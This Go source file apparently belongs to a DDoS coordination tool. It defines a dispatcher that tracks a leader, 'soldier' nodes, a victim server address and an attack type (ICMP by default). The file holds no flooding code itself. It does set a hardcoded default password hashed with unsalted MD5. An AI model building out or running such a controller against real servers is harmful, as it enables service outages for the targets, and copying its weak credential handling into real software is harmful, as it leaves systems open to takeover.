package dispatcher

import (
	"crypto/md5"
	"encoding/hex"
	"sync"
)

type Dispatcher struct {
	ListeningAddress string
	ListeningPort    string

	Cmp Camp
}

var instance *Dispatcher
var Once sync.Once

func NewDispatcher() *Dispatcher {
	Once.Do(func() {
		instance = &Dispatcher{}
	})
	return instance
}

func HashOf(password string) string {
	hashes := md5.New()
	hashes.Write([]byte(password))
	return hex.EncodeToString(hashes.Sum(nil))
}

func (d *Dispatcher) SetupDefault() {
	d.ListeningAddress = "localhost"
	d.ListeningPort = "8080"
	d.Cmp.Leader.Name = "leader"
	d.Cmp.Leader.AuthenticationHash = HashOf("password")
	d.Cmp.Settings.Status = StatusStopped
	d.Cmp.Settings.VictimServer = "127.0.0.1:8080"
	d.Cmp.Settings.DDOSType = DDOSTypeICMP
	d.Cmp.Soldiers = make([]Soldier, 0)
}

func (c *Camp) UpdateSettings(status, victim, ddosType string) {
	if status != "" {
		c.Settings.Status = status
	}
	if victim != "" {
		c.Settings.VictimServer = victim
	}
	if ddosType != "" {
		c.Settings.DDOSType = ddosType
	}
}
